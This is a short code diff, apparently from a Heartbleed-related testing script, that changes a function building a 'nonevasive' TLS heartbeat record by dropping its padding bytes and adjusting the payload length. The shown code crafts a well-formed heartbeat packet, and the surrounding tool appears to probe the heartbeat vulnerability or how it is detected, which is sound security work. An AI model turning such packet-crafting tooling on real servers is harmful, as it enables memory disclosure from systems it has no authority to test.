@@ -47,16 +47,12 @@ hb = h2bin('''
 ''')
 
 def create_nonevasive():
-    size = 20
-    paddinglength = 16
-    payloadlength = size - paddinglength - 3
+    size = 16
+    payloadlength = size - 3
     heartbeat = "180302%04X01%04X" % (size, size - 3)
 
     for i in range(payloadlength):
 	heartbeat += '4C'
-
-    for i in range(paddinglength):
-	heartbeat += '50'
 
     return h2bin(heartbeat)
 
